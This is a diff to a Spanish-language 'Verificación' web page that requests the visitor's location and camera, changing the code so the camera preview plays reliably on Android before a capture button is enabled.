@@ -31,7 +31,7 @@ button {
 
 <h2>Verificación</h2>
 
-<video id="video" autoplay playsinline></video>
+<video id="video" autoplay playsinline muted></video>
 <br>
 
 <button id="btn" onclick="capturar()" disabled>Cargando cámara...</button>
@@ -54,27 +54,28 @@ navigator.geolocation.getCurrentPosition(
     }
 );
 
-// 📸 CÁMARA (FIX ANDROID)
+// 📸 CÁMARA (FIX REAL ANDROID)
 let video = document.getElementById('video');
 let btn = document.getElementById('btn');
 
 navigator.mediaDevices.getUserMedia({
-    video: {
-        facingMode: "user"
-    },
+    video: true,
     audio: false
 })
 .then(stream => {
     video.srcObject = stream;
 
-    video.onloadedmetadata = () => {
-        video.play(); // 🔥 clave para Android
-    };
+    // 🔥 FORZAR REPRODUCCIÓN
+    video.setAttribute("playsinline", true);
+    video.muted = true;
 
-    video.onplaying = () => {
+    video.play().then(() => {
         btn.disabled = false;
         btn.innerText = "Continuar";
-    };
+    }).catch(err => {
+        alert("Error play: " + err.message);
+    });
+
 })
 .catch(err => {
     alert("Error cámara: " + err.message);
